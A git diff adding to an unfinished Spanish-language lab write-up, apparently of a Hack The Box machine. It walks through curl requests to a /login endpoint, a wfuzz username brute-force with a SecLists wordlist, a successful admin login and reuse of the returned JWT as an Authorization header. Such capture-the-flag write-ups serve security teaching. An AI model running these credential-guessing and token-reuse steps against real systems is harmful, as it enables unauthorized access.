@@ -77,5 +77,55 @@ Hagamos un poco de fuzzing, para ver que podemos encontrar. Luego trataremos de 
 
 ![f2](https://user-images.githubusercontent.com/87484792/183147971-43dda29d-a3a6-4793-b315-15e96c0f74e0.png)
 
+Es interesante, poder encontrar un **/login**. Mandemos una petición a ver que nos reporta. Empezaremos a usar cURL.
+
+`curl -s http://10.10.10.137:3000/login`
+
+La respuesta fue esta:
+
+![atuh](https://user-images.githubusercontent.com/87484792/183148580-b88efcee-2f8d-41f6-96c7-2390e91f11f3.png)
+
+Curioso, nos pide unas credenciales. Por suerte, tenemos una.
+Probaremos las credenciales que tenemos. 
+
+`curl -s http://10.10.10.137:3000/login --data 'username=root&password=Zk6heYCyv6ZE9Xcg'`
+
+La respuesta no fue del todo lo que esperaba
+
+`Forbidden`
+
+Pude intuir que tratandose de un login, esperaba **username** y **password**. Sin embargo, creo que las credenciales no son correctas.
+Puedo confirmar mis sospechas modificando los parametros esperados, probaré user y pass para ver la respuesta.
+
+`curl -s http://10.10.10.137:3000/login --data 'user=root&pass=Zk6heYCyv6ZE9Xcg'`
+
+Obtenemos esto:
+
+`Bad Request`
+
+Bien, con esto puedo intuir que la primera opción es la correcta, el servidor actua diferente según lo que recibe.
+Sin embargo algo no le esta gustando, por logica la contraseña no es algo que deberian darme mal. Así que vamos a ver si encontramos el usuario.
+Para ello vamos a fuzzear nuevamente.
+
+`wfuzz --hc 404,403 -c -w /usr/share/SecLists/Usernames/xato-net-10-million-usernames.txt -d "username=FUZZ&password=Zk6heYCyv6ZE9Xcg" http://10.10.10.137:3000/login`
+
+Voy a utilizar un diccionario de usuarios de SecLists. Espero con esto que me reporte un usuario válido.
+
+![Sin título](https://user-images.githubusercontent.com/87484792/183150630-dc46afeb-38bf-4435-a558-d910fcd2c902.png)
+
+Hemos encontrado el usuario. Veamos que nos responden ahora.
+
+`curl -s http://10.10.10.137:3000/login --data 'username=admin&password=Zk6heYCyv6ZE9Xcg' `
+
+Obtenemos esto:
+
+`{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjU5NzI5MTk5LCJleHAiOjE2NTk4MTU1OTl9.FkmkfrjYNhGhYk0pfkltl9YMHl-omAYZcDw1AxVOxDI"}`
+
+Tenemos un token JWT. Este token muy posiblemente sea el que nos pedian setear pasos atras.
+Aqui igual que antes, tenemos que buscar el nombre del token. En este caso, **Authorization** es lo que esperaba recibir el servidor.
+Y con esto ya tendriamos construido el token que nos hacia falta al principio.
+
+`Authorization=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjU5NzI5MTk5LCJleHAiOjE2NTk4MTU1OTl9.FkmkfrjYNhGhYk0pfkltl9YMHl-omAYZcDw1AxVOxDI`
 
 
+----- En Proceso ------
